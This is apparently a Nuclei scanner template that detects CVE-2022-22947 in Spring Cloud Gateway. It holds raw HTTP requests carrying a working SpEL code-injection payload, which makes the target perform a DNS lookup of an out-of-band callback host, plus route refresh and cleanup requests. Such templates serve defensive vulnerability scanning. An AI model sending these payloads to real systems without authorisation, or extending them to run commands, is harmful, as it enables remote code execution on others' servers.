id: CVE-2022-22947
info:
  author: pdteam
  classification:
    cve-id: CVE-2022-22947
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-94
  description: Applications using Spring Cloud Gateway prior to 3.1.1+ and 3.0.7+
    are vulnerable to a code injection attack when the Gateway Actuator endpoint is
    enabled, exposed and unsecured. A remote attacker could make a maliciously crafted
    request that could allow arbitrary remote execution on the remote host.
  name: Spring Cloud Gateway Code Injection
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2022-22947
  - https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/
  - https://github.com/wdahlenburg/spring-gateway-demo
  - https://spring.io/blog/2022/03/01/spring-cloud-gateway-cve-reports-published
  - https://tanzu.vmware.com/security/cve-2022-22947
  severity: critical
  tags: cve,cve2022,apache,spring,vmware,actuator,oast
requests:
- matchers:
  - status:
    - 201
    type: status
  - part: header
    type: word
    words:
    - /routes/{{randstr}}
  - part: interactsh_protocol
    type: word
    words:
    - dns
  matchers-condition: and
  raw:
  - "POST /actuator/gateway/routes/{{randstr}} HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/json\n\n{\n  \"predicates\": [\n    {\n      \"name\": \"Path\"\
    ,\n      \"args\": {\n        \"_genkey_0\": \"/{{randstr}}/**\"\n      }\n  \
    \  }\n  ],\n  \"filters\": [\n    {\n      \"name\": \"RewritePath\",\n      \"\
    args\": {\n        \"_genkey_0\": \"#{T(java.net.InetAddress).getByName(\\\"{{interactsh-url}}\\\
    \")}\",\n        \"_genkey_1\": \"/${path}\"\n      }\n    }\n  ],\n  \"uri\"\
    : \"{{RootURL}}\",\n  \"order\": 0\n}\n"
  - "POST /actuator/gateway/refresh HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    \n{\n  \"predicate\": \"Paths: [/{{randstr}}], match trailing slash: true\",\n\
    \  \"route_id\": \"{{randstr}}\",\n  \"filters\": [\n    \"[[RewritePath #{T(java.net.InetAddress).getByName(\\\
    \"{{interactsh-url}}\\\")} = /${path}], order = 1]\"\n  ],\n  \"uri\": \"{{RootURL}}\"\
    ,\n  \"order\": 0\n}\n"
  - 'DELETE /actuator/gateway/routes/{{randstr}} HTTP/1.1

    Host: {{Hostname}}

    '
